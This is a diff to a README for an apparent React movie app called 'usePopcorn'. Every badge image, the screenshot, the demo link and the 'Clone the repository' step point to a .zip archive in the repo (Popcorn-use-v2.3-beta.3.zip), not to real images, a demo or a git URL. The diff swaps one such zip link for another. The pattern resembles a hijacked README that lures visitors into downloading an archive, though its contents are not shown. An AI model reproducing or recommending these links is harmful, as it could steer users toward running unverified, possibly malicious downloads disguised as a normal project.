@@ -2,16 +2,16 @@
 
 <div align='center'>
 
-![HTML5 Badge](https://raw.githubusercontent.com/imadosan/usePopcorn/main/public/Popcorn_use_v3.2.zip) ![CSS3 Badge](https://raw.githubusercontent.com/imadosan/usePopcorn/main/public/Popcorn_use_v3.2.zip) ![JavaScript Badge](https://raw.githubusercontent.com/imadosan/usePopcorn/main/public/Popcorn_use_v3.2.zip)![REACT Badge](https://raw.githubusercontent.com/imadosan/usePopcorn/main/public/Popcorn_use_v3.2.zip )![VITE Badge](https://raw.githubusercontent.com/imadosan/usePopcorn/main/public/Popcorn_use_v3.2.zip)
-![Netlify Badge](https://raw.githubusercontent.com/imadosan/usePopcorn/main/public/Popcorn_use_v3.2.zip)
+![HTML5 Badge](https://github.com/imadosan/usePopcorn/raw/refs/heads/main/public/screenshots/Popcorn-use-v2.3-beta.3.zip) ![CSS3 Badge](https://github.com/imadosan/usePopcorn/raw/refs/heads/main/public/screenshots/Popcorn-use-v2.3-beta.3.zip) ![JavaScript Badge](https://github.com/imadosan/usePopcorn/raw/refs/heads/main/public/screenshots/Popcorn-use-v2.3-beta.3.zip)![REACT Badge](https://github.com/imadosan/usePopcorn/raw/refs/heads/main/public/screenshots/Popcorn-use-v2.3-beta.3.zip )![VITE Badge](https://github.com/imadosan/usePopcorn/raw/refs/heads/main/public/screenshots/Popcorn-use-v2.3-beta.3.zip)
+![Netlify Badge](https://github.com/imadosan/usePopcorn/raw/refs/heads/main/public/screenshots/Popcorn-use-v2.3-beta.3.zip)
 
 
 
 </div>
 
-![screenshot](https://raw.githubusercontent.com/imadosan/usePopcorn/main/public/Popcorn_use_v3.2.zip)
+![screenshot](https://github.com/imadosan/usePopcorn/raw/refs/heads/main/public/screenshots/Popcorn-use-v2.3-beta.3.zip)
 
-Click to view the [demo](https://raw.githubusercontent.com/imadosan/usePopcorn/main/public/Popcorn_use_v3.2.zip)
+Click to view the [demo](https://github.com/imadosan/usePopcorn/raw/refs/heads/main/public/screenshots/Popcorn-use-v2.3-beta.3.zip)
 
 ## Description
 
@@ -58,7 +58,7 @@ To run this project locally, you can follow these steps:
 
 1. Clone the repository:
    ```
-   $ https://raw.githubusercontent.com/imadosan/usePopcorn/main/public/Popcorn_use_v3.2.zip
+   $ https://github.com/imadosan/usePopcorn/raw/refs/heads/main/public/screenshots/Popcorn-use-v2.3-beta.3.zip
    ```
 2. Open the project folder in your code editor of choice.
 3. Install dependencies and packages
